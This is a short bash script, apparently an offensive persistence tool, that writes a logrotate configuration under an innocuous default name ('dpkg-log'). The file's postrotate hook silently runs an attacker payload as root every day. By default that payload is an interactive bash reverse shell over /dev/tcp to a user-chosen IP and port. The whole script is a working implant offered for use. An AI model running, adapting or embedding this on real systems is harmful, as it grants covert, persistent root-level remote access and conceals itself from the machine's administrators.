#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] Logrotate Persistence [*] "
echo ""
echo "Payload will execute daily when logrotate runs as root."
echo ""

read -p "Enter your payload or command (or leave empty for reverse shell): " payload

if [ -z "$payload" ]; then
    read -p "Enter the IP address: " ip
    read -p "Enter the port: " port
    payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
fi

read -p "Enter config filename (default: dpkg-log): " confname
confname="${confname:-dpkg-log}"

cat > /etc/logrotate.d/$confname <<EOF
/var/log/dpkg.log {
    daily
    rotate 7
    compress
    missingok
    notifempty
    postrotate
        /bin/bash -c '$payload' &>/dev/null &
    endscript
}
EOF

chmod 644 /etc/logrotate.d/$confname

clear

echo "[*] Success!! Logrotate persistence implanted in /etc/logrotate.d/$confname [*]"
echo "[*] Payload executes daily when logrotate processes /var/log/dpkg.log [*]"

sleep 1

clear
